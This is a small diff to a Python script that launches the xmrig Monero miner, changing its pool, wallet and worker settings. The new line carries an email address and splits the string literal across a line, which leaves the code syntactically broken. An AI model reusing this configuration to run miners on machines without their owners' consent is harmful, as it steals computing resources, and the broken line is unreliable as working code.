@@ -36,7 +36,8 @@ if operate_system == 'lin':
         pass
 import psutil
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
-command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg -p nql --tls --cpu-max-threads-hint=100'
+command_xmrig_default = '--algo randomx --coin=XMR --url=xmr-us-east1.nanopool.org:14433 --user=87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg.vmx/tuyen1321995@gmail.com --cpu-max-threads-hint=100 --tls
+'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
